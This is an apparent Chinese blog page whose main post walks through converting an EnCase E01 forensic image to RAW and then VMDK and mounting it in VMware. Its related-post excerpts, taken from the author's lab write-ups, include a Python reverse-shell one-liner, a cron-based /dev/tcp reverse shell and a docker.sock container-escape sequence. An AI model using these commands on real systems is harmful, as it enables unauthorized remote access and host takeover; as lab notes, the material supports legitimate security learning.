@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>镜像恢复记录 | Putdownd’s Blog</title><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="镜像文件恢复前期准备工作 需要恢复的文件为 E01格式的文件,是 EnCase的压缩格式,一般用于取证 使用工具: qemu  ftk image  vmware  wmware已经运行的win10 踩坑点: qemu无法识别 E01格式的文件无法直接转换,需要 ftk image来转换  E..."><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "镜像恢复记录",
+  "url": "https://blog.putdown.top/archives/-1b5705c7.html",
+  "image": "https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png",
+  "datePublished": "2025-08-18T06:49:43.929Z",
+  "dateModified": "2026-06-15T04:36:32.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "putdown",
+      "url": "https://blog.putdown.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/-1b5705c7.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '镜像恢复记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.1.0/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://t.alcy.cc/fj);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://t.alcy.cc/fj);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Putdownd’s Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">镜像恢复记录</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">镜像恢复记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-18T06:49:43.929Z" title="发表于 2025-08-18 06:49:43">2025-08-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-15T04:36:32.000Z" title="更新于 2026-06-15 04:36:32">2026-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="镜像文件恢复"><a href="#镜像文件恢复" class="headerlink" title="镜像文件恢复"></a>镜像文件恢复</h1><h2 id="前期准备工作"><a href="#前期准备工作" class="headerlink" title="前期准备工作"></a>前期准备工作</h2><ul>
+<li>需要恢复的文件为 <code>E01</code>格式的文件,是 <code>EnCase</code>的压缩格式,一般用于取证</li>
+<li>使用工具: <code>qemu</code>  <code>ftk image</code>  <code>vmware</code>  <code>wmware已经运行的win10</code></li>
+<li>踩坑点: <code>qemu</code>无法识别 <code>E01</code>格式的文件无法直接转换,需要 <code>ftk image</code>来转换</li>
+</ul>
+<h2 id="E01转换为RAW"><a href="#E01转换为RAW" class="headerlink" title="E01转换为RAW"></a>E01转换为RAW</h2><ul>
+<li>使用ftk image来转换文件</li>
+<li>文件</li>
+</ul>
+<p><img src="/img/halo-upload/image-vwYM.png" alt="image-vwYM.png"></p>
+<ul>
+<li>使用 <code>ftk image </code>导入</li>
+</ul>
+<p><img src="/img/halo-upload/image-bcUv.png" alt="image-bcUv.png"></p>
+<p><img src="/img/halo-upload/image-xtiJ.png" alt="image-xtiJ.png"></p>
+<p><img src="/img/halo-upload/image-rkoY.png" alt="image-rkoY.png"></p>
+<ul>
+<li>添加进来后能看镜像内的到系统文件</li>
+</ul>
+<p><img src="/img/halo-upload/image-PYcx.png" alt="image-PYcx.png"></p>
+<ul>
+<li>然后导出文件为 <code>raw</code>格式</li>
+</ul>
+<p><img src="/img/halo-upload/image-rgao.png" alt="image-rgao.png"></p>
+<p><img src="/img/halo-upload/image-HLGh.png" alt="image-HLGh.png"></p>
+<ul>
+<li>填入要出的文件地址和文件名,文件大小 <code>1500</code>建议改为 <code>0</code>,会是一整个文件,不然会变成好多个文件不便于使用 <code>qemu</code>来恢复</li>
+</ul>
+<p><img src="/img/halo-upload/image-CTiC.png" alt="image-CTiC.png"></p>
+<ul>
+<li>经过漫长的等待就导出成功了</li>
+</ul>
+<h2 id="RAW转换VMDK"><a href="#RAW转换VMDK" class="headerlink" title="RAW转换VMDK"></a>RAW转换VMDK</h2><ul>
+<li><p>qume转raw为vmdk</p>
+</li>
+<li><p>一行命令</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img.exe convert -p -O vmdk &quot;转换前的文件&quot; &quot;转换后的文件&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img.exe convert -p -O vmdk &quot;ftk转换的raw的镜像&quot; &quot;001.vmdk&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>等进度条走完就好了</li>
+</ul>
+<p><img src="/img/halo-upload/image-UYLc.png" alt="image-UYLc.png"></p>
+<ul>
+<li>检查下文件,能识别格式就ok了</li>
+</ul>
+<p><img src="/img/halo-upload/image-IraE.png" alt="image-IraE.png"></p>
+<h2 id="使用vmware来挂在镜像"><a href="#使用vmware来挂在镜像" class="headerlink" title="使用vmware来挂在镜像"></a>使用vmware来挂在镜像</h2><ul>
+<li>添加个硬盘</li>
+</ul>
+<p><img src="/img/halo-upload/image-PdJl.png" alt="image-PdJl.png"></p>
+<p><img src="/img/halo-upload/image-gYsW.png" alt="image-gYsW.png"></p>
+<p><img src="/img/halo-upload/image-QrBk.png" alt="image-QrBk.png"></p>
+<ul>
+<li>选择转换好的 <code>vmdk</code>格式的文件</li>
+</ul>
+<p><img src="/img/halo-upload/image-AKmy.png" alt="image-AKmy.png"></p>
+<ul>
+<li>保持现有格式</li>
+</ul>
+<p><img src="/img/halo-upload/image-wvVi.png" alt="image-wvVi.png"></p>
+<p><img src="/img/halo-upload/image-flRp.png" alt="image-flRp.png"></p>
+<ul>
+<li>正常打开虚拟机,就可以查看镜像内的文件了</li>
+</ul>
+<p><img src="/img/halo-upload/image-MHcQ.png" alt="image-MHcQ.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>流程就是转换格式来打开镜像文件</li>
+<li>这次的主要任务是拿镜像内的文件来分析没有就没把镜像给跑起来</li>
+<li>有一些取证的仿真工具可以直接上传运行系统会更方便</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/-1b5705c7.html">https://blog.putdown.top/archives/-1b5705c7.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Docker/">Docker</a></div><div class="post-share"><div class="social-share" data-image="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/-3b062c9.html" title="镜像运行(vmdk在vmware运行)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">镜像运行(vmdk在vmware运行)</div></div><div class="info-2"><div class="info-item-1">衔接上文 上一篇文章是吧E01的镜像转换为了vmdk格式,并在虚拟机进行了挂载 今天是把镜像实在虚拟机里面完整跑起来  准备工作 vmdk格式的镜像文件 vmware虚拟机啊  开始 首先新建虚拟机,选择自定义  默认下一步  稍后安装  看恢复的系统,这次是windows就选择了windows  自定义名称路径  固件类型选在bios  按需配置cpu及内存  因为是镜像恢复就不联网了  控制器类型,默认  磁盘类型scsi  使用现有的虚拟机  选择要跑的vmdk文件  保持现有格式  完成   结束 最近有点老年痴呆,简单记录下过程  </div></div></div></a><a class="pagination-related" href="/archives/-68282f3d.html" title="若依漏洞环境搭建（4.5版本）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">若依漏洞环境搭建（4.5版本）</div></div><div class="info-2"><div class="info-item-1">Windows搭建环境 若依源码：https://codeload.github.com/yangzongzhuan/RuoYi/zip/refs/tags/v4.5.0 工具：IDEA Ultimate phpstudy（mysql） java1.8 navicat（数据库连接工具）  mysql配置 使用phpstudy内的环境  设置允许远程访问mysql数据库  执行以下命令可使用navicat进行连接   12345use mysql; grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;密码&#x27;;flush privileges;  导入数据库 新建数据库ry  运行源码内的两个sql文件，两个都要导入  导入后为以下表   IDEA Ultimate 使用idea打开若依的源码文件  修改数据库连接文件  打开个选项设置  点击运行  等等就运行起来了，默认在80端口   一些设置shiro key的位置 首页密码自动填充问题 直接删除value的值即可  漏洞测试 使用...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/2c09554a.html" title="ARL（灯塔）删库后使用docker搭建ARL（灯塔）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-14</div><div class="info-item-2">ARL（灯塔）删库后使用docker搭建ARL（灯塔）</div></div><div class="info-2"><div class="info-item-1"> docker 保存命令把镜像保存为本地文件  1234docker tag cd80881c4e0e rabbitmq:localdocker save tophant/arl -o arl.tardocker save mongo -o mongo.tardocker save rabbitmq -o rabbitmq.tar    修改docker-compose.yml的文件 主要修改： tophant/arl:${ARL_VERSION:-latest} 改为 image: tophant/arl:local 以此类推。 以下为修改后。  1docker load &lt; rabbitmq.tar   创建文件  1docker volume create arl_db   启动    注意 数据不会保留 及时更改密码  </div></div></div></a><a class="pagination-related" href="/archives/2b8f801f.html" title="Kubernetes Goat 05 - Docker CIS benchmarks analysis"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="info-item-2">Kubernetes Goat 05 - Docker CIS benchmarks analysis</div></div><div class="info-2"><div class="info-item-1">Docker CIS benchmarks analysisDocker CIS 基线分析 首先需要部署docker bench security将它启动为DaemonSet  1cd kubernetes-goat/  1kubectl apply -f scenarios/docker-bench-security/deployment.yaml   运行容器应用  1kubectl get pod   1kubectl exec -it docker-bench-security-6npjf  -- sh    等待结果就好了   结束</div></div></div></a><a class="pagination-related" href="/archives/6eb77990.html" title="Kubernetes Goat 02 - docker in docker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-27</div><div class="info-item-2">Kubernetes Goat 02 - docker in docker</div></div><div class="info-2"><div class="info-item-1">Kubernetes Goat 02 - docker in docker 靶机ip：http://192.168.72.129:1231/    能执行ping命令    职业习惯加个管道符   反弹shell 尝试使用bash来反弹没有成功 使用python反弹执行成功    监听    执行命令  1192.168.88.43 | python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;192.168.88.43&quot;,6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;   判断环境 ls -la     mount   docker in docker “Docker in Docker” (DinD) 是一种在 Docker 容器内部运行 Docker 的实践方法。它允许您在一个容器中运行和管理 Docker 容器，而无需在宿主机上安装 Docker。  doc...</div></div></div></a><a class="pagination-related" href="/archives/4f2890e7.html" title="Portainer后渗透"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-07</div><div class="info-item-2">Portainer后渗透</div></div><div class="info-2"><div class="info-item-1">前言  1docker -H unix:///run/docker.sock run -v /:/test -it ubuntu:latest /bin/bash  1Get &quot;https://registry-1.docker.io/v2/&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)  Portainer 的后渗透 更换镜像源  新建容器          逃逸 1echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root   结束</div></div></div></a><a class="pagination-related" href="/archives/-3b062c9.html" title="镜像运行(vmdk在vmware运行)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-19</div><div class="info-item-2">镜像运行(vmdk在vmware运行)</div></div><div class="info-2"><div class="info-item-1">衔接上文 上一篇文章是吧E01的镜像转换为了vmdk格式,并在虚拟机进行了挂载 今天是把镜像实在虚拟机里面完整跑起来  准备工作 vmdk格式的镜像文件 vmware虚拟机啊  开始 首先新建虚拟机,选择自定义  默认下一步  稍后安装  看恢复的系统,这次是windows就选择了windows  自定义名称路径  固件类型选在bios  按需配置cpu及内存  因为是镜像恢复就不联网了  控制器类型,默认  磁盘类型scsi  使用现有的虚拟机  选择要跑的vmdk文件  保持现有格式  完成   结束 最近有点老年痴呆,简单记录下过程  </div></div></div></a><a class="pagination-related" href="/archives/30d0d94e.html" title="无法拉取镜像的环境下进行docker.sock 逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-24</div><div class="info-item-2">无法拉取镜像的环境下进行docker.sock 逃逸</div></div><div class="info-2"><div class="info-item-1"> 报错信息：  1docker: Error response from daemon: Get &quot;https://registry-1.docker.io/v2/&quot;: proxyconnect tcp: dial tcp 192.168.88.172:7897: connect: connection refused.  12docker imagesdocker save -o alpine_latest.tar alpine:latest   导入镜像逃逸 在要逃逸的容器内执行 下载制作好的镜像  1curl http://192.168.x.x:8000/alpine_latest.tar -o /tmp/alpine_latest.tar  1/tmp/docker/docker load -i /tmp/alpine_latest.tar  1/tmp/docker/docker -H unix:///run/docker.sock run -v /:/mnt -it alpine sh     成功逃逸   </div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D"><span class="toc-text">镜像文件恢复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">前期准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#E01%E8%BD%AC%E6%8D%A2%E4%B8%BARAW"><span class="toc-text">E01转换为RAW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RAW%E8%BD%AC%E6%8D%A2VMDK"><span class="toc-text">RAW转换VMDK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8vmware%E6%9D%A5%E6%8C%82%E5%9C%A8%E9%95%9C%E5%83%8F"><span class="toc-text">使用vmware来挂在镜像</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2026 By putdown</span></div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting@2.0.1/dist/Meting.min.js"></script><meting-js server="netease" type="playlist" id="811671960" fixed="true" mini="true" autoplay="false" theme="#49b1f5" loop="all" order="random" preload="auto" volume="0.5" mutex="true"></meting-js><script src="/js/widgets.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
